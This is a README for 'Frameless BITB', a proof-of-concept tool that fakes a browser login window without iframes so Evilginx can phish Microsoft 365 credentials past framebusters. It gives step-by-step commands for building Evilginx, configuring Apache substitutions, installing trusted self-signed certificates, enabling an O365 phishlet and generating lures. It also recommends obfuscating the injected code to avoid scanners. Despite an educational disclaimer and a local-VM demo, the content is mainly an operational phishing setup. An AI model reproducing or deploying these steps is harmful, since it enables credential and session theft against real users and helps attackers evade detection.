# Frameless BITB

A new approach to Browser In The Browser (BITB) without the use of iframes, allowing the bypass of traditional framebusters implemented by login pages like Microsoft.

This POC code is built for using this new BITB with Evilginx, and a Microsoft Enterprise phishlet.


![Frameless-BITB-DEMO-compressed](https://github.com/waelmas/frameless-bitb/assets/43114112/4b4fbc89-526b-4982-b5e1-a8faf9754977)


Before diving deep into this, I recommend that you first check my talk at BSides 2023, where I first introduced this concept along with important details on how to craft the "perfect" phishing attack. [▶ Watch Video](https://www.youtube.com/watch?v=p1opa2wnRvg)

☕︎ [Buy Me A Coffee](https://www.buymeacoffee.com/waelmas)

[**Video Tutorial:** 👇](#video-tutorial)

# Disclaimer

This tool is for educational and research purposes only. It demonstrates a non-iframe based Browser In The Browser (BITB) method. The author is not responsible for any misuse. Use this tool only legally and ethically, in controlled environments for cybersecurity defense testing. By using this tool, you agree to do so responsibly and at your own risk.


# Backstory - The Why

Over the past year, I've been experimenting with different tricks to craft the "perfect" phishing attack.
The typical "red flags" people are trained to look for are things like urgency, threats, authority, poor grammar, etc.
The next best thing people nowadays check is the link/URL of the website they are interacting with, and they tend to get very conscious the moment they are asked to enter sensitive credentials like emails and passwords.

That's where Browser In The Browser (BITB) came into play. Originally introduced by @mrd0x, BITB is a concept of creating the appearance of a believable browser window inside of which the attacker controls the content (by serving the malicious website inside an iframe). However, the fake URL bar of the fake browser window is set to the legitimate site the user would expect. This combined with a tool like Evilginx becomes the perfect recipe for a believable phishing attack.

The problem is that over the past months/years, major websites like Microsoft implemented various little tricks called "framebusters/framekillers" which mainly attempt to break iframes that might be used to serve the proxied website like in the case of Evilginx.

In short, Evilginx + BITB for websites like Microsoft no longer works. At least not with a BITB that relies on iframes.


# The What

A Browser In The Browser (BITB) without any iframes! As simple as that.

Meaning that we can now use BITB with Evilginx on websites like Microsoft.

Evilginx here is just a strong example, but the same concept can be used for other use-cases as well.


# The How

Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page.
This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect.
We also use an additional trick called "Shadow DOM" in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.


# Instructions

## Video Tutorial

[![Thumbnail with YouTube Player](https://github.com/waelmas/frameless-bitb/assets/43114112/5ebadac3-6998-4349-9c90-c1c5293ac6b6)](https://youtu.be/luJjxpEwVHI)


https://youtu.be/luJjxpEwVHI

## Local VM:
Create a local Linux VM. (I personally use Ubuntu 22 on VMWare Player or Parallels Desktop)

Update and Upgrade system packages:

```
sudo apt update && sudo apt upgrade -y
```




## Evilginx Setup:


#### Setting Up Evilginx


Download and build Evilginx: [Official Docs](https://help.evilginx.com/docs/intro)


Copy Evilginx files to `/home/username`



Install Go: [Official Docs](https://go.dev/doc/install)

```
wget https://go.dev/dl/go1.21.4.linux-amd64.tar.gz
```

```
sudo tar -C /usr/local -xzf go1.21.4.linux-amd64.tar.gz
```

```
nano ~/.profile
```

ADD: `export PATH=$PATH:/usr/local/go/bin`

```
source ~/.profile
```

Check:
```
go version
```

Install make:

```
sudo apt install make
```

Build Evilginx:

```
cd /home/username/evilginx2
```

```
make
```


Create a new directory for our evilginx build along with phishlets and redirectors:

```
mkdir /home/username/hack
```


Copy build, phishlets, and redirectors:

```
cp /home/kali/evilginx2/build/evilginx /home/kali/hack/evilginx

cp -r /home/kali/evilginx2/redirectors /home/kali/hack/redirectors

cp -r /home/kali/evilginx2/phishlets /home/kali/hack/phishlets
```

## Modify Evilginx Configurations:


Since we will be using Apache2 in front of Evilginx, we need to make Evilginx listen to a different port than 443.

```
nano ~/.evilginx/config.json
```

CHANGE `https_port` from `443` to `8443`



## Install Apache2 and Enable Mods:

Install Apache2:

```
sudo apt install apache2 -y
```


Enable Apache2 mods that will be used:
(We are also disabling access_compat module as it sometimes causes issues)

```
sudo a2enmod proxy
sudo a2enmod proxy_http
sudo a2enmod proxy_balancer
sudo a2enmod lbmethod_byrequests
sudo a2enmod env
sudo a2enmod include
sudo a2enmod setenvif
sudo a2enmod ssl
sudo a2ensite default-ssl
sudo a2enmod cache
sudo a2enmod substitute
sudo a2enmod headers
sudo a2enmod rewrite
sudo a2dismod access_compat
```

Start and enable Apache:

```
sudo systemctl start apache2
```

```
sudo systemctl enable apache2
```

Try if Apache and VM networking works by visiting the VM's IP from a browser on the host machine.





## Clone this Repo:

Install git if not already available:

```
sudo apt -y install git
```

Clone this repo:

```
git clone https://github.com/waelmas/frameless-bitb
```

```
cd frameless-bitb
```




## Apache Custom Pages:


Make directories for the pages we will be serving:

- home: (Optional) Homepage (at base domain)
- primary: Landing page (background)
- secondary: BITB Window (foreground)


```
sudo mkdir /var/www/home
sudo mkdir /var/www/primary
sudo mkdir /var/www/secondary
```


Copy the directories for each page:

```

sudo cp -r ./pages/home/ /var/www/

sudo cp -r ./pages/primary/ /var/www/

sudo cp -r ./pages/secondary/ /var/www/

```

Optional: Remove the default Apache page (not used):

```
sudo rm -r /var/www/html/
```


From inside the hack dir - copy the O365 phishlet to phishlets directory:

```
sudo cp /home/kali/hack/frameless-bitb/O365.yaml /home/kali/hack/phishlets/O365.yaml
```



**Optional:** To set the Calendly widget to use your account instead of the default I have inside, go to `pages/primary/script.js` and change the `CALENDLY_PAGE_NAME` and `CALENDLY_EVENT_TYPE`.

**Note on Demo Obfuscation:** As I explain in the walkthrough video, I included a minimal obfuscation for text content like URLs and titles of the BITB. You can open the demo obfuscator by opening `demo-obfuscator.html` in your browser.
In a real-world scenario, I would highly recommend that you obfuscate larger chunks of the HTML code injected or use JS tricks to avoid being detected and flagged. The advanced version I am working on will use a combination of advanced tricks to make it nearly impossible for scanners to fingerprint/detect the BITB code, so stay tuned.


## Self-signed SSL certificates:

Since we are running everything locally, we need to generate self-signed SSL certificates that will be used by Apache. Evilginx will not need the certs as we will be running it in developer mode.


We will use the domain `etech-it.com.au` which will point to our local VM. If you want to use a different domain, make sure to change the domain in all files (Apache conf files, JS files, etc.)


Create dir and parents if they do not exist:

```
sudo mkdir -p /etc/ssl/localcerts/etech-it.com.au/
```


Generate the SSL certs using the OpenSSL config file:

```
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout /etc/ssl/localcerts/etech-it.com.au/privkey.pem -out /etc/ssl/localcerts/etech-it.com.au/fullchain.pem \
-config openssl-local.cnf
```

Modify private key permissions:

```
sudo chmod 600 /etc/ssl/localcerts/etech-it.com.au/privkey.pem
```




## Apache Custom Configs:

Copy custom substitution files (the core of our approach):

```
sudo cp -r ./custom-subs /etc/apache2/custom-subs
```

Simply to make it easier, I included both versions as separate files for this next step.


**Windows/Chrome** BITB:

```
sudo cp ./apache-configs/win-chrome-bitb.conf /etc/apache2/sites-enabled/000-default.conf
```





Test Apache configs to ensure there are no errors:

```
sudo apache2ctl configtest
```

Restart Apache to apply changes:

```
sudo systemctl restart apache2
```


## Modifying Hosts:


Get the IP of the VM using `ifconfig` and note it somewhere for the next step.

We now need to add new entries to our hosts file, to point the domain used in this demo `etech-it.com.au` and all used subdomains to our VM on which Apache and Evilginx are running.



**On Windows:**

Open Notepad as Administrator (Search > Notepad > Right-Click > Run as Administrator)

Click on the File option (top-left) and in the File Explorer address bar, copy and paste the following:

`C:\Windows\System32\drivers\etc\`

Change the file types (bottom-right) to "All files".

Double-click the file named `hosts`


Now modify the following records (replace `[IP]` with the IP of your VM) then paste the records at the end of the hosts file:

```
# Local Apache and Evilginx Setup
[IP] login.etech-it.com.au
[IP] account.etech-it.com.au
[IP] sso.etech-it.com.au
[IP] www.etech-it.com.au
[IP] portal.etech-it.com.au
[IP] etech-it.com.au
# End of section
```

Save and exit.

Now restart your browser before moving to the next step.


#### Important Note:
This demo is made with the provided Office 365 Enterprise phishlet. To get the host entries you need to add for a different phishlet, use `phishlet get-hosts [PHISHLET_NAME]` but remember to replace the `127.0.0.1` with the actual local IP of your VM.



## Trusting the Self-Signed SSL Certs:


Since we are using self-signed SSL certificates, our browser will warn us every time we try to visit `etech-it.com.au` so we need to make our host machine trust the certificate authority that signed the SSL certs.

For this step, it's easier to follow the video instructions, but here is the gist anyway.



Open [https://etech-it.com.au/](https://etech-it.com.au/) in your Chrome browser.

Ignore the Unsafe Site warning and proceed to the page.


Click the SSL icon > Details > Export Certificate
**IMPORTANT:** When saving, the name MUST end with .crt for Windows to open it correctly.

Double-click it > install for current user. Do NOT select automatic, instead place the certificate in specific store: select "Trusted Route Certification Authorities".



**On Mac:** to install for current user only > select "Keychain: login" **AND** click on "View Certificates" > details > trust > Always trust



**Now RESTART your Browser**

You should be able to visit `https://etech-it.com.au` now and see the homepage without any SSL warnings.


## Running Evilginx:


At this point, everything should be ready so we can go ahead and start Evilginx, set up the phishlet, create our lure, and test it.

```
cd ~/evilginx/
```

```
./evilginx -developer
```

Evilginx Config:

```
config domain etech-it.com.au
```

```
config ipv4 127.0.0.1
```


**IMPORTANT:** Set Evilginx Blacklist mode to NoAdd to avoid blacklisting Apache since all requests will be coming from Apache and not the actual visitor IP.

```
blacklist noadd
```



Setup Phishlet and Lure:

```
phishlets hostname O365 etech-it.com.au
```

```
phishlets enable O365
```

```
lures create O365
```

```
lures get-url 0
```


Copy the lure URL and visit it from your browser (use Guest user on Chrome to avoid having to delete all saved/cached data between tests).



# Useful Resources


Original iframe-based BITB by @mrd0x:
[https://github.com/mrd0x/BITB](https://github.com/mrd0x/BITB)

Evilginx Mastery Course by the creator of Evilginx @kgretzky:
[https://academy.breakdev.org/evilginx-mastery](https://academy.breakdev.org/evilginx-mastery)

My talk at BSides 2023:
[https://www.youtube.com/watch?v=p1opa2wnRvg](https://www.youtube.com/watch?v=p1opa2wnRvg)

How to protect Evilginx using Cloudflare and HTML Obfuscation:
[https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)

Evilginx resources for Microsoft 365 by @BakkerJan:
[https://janbakker.tech/evilginx-resources-for-microsoft-365/](https://janbakker.tech/evilginx-resources-for-microsoft-365/)


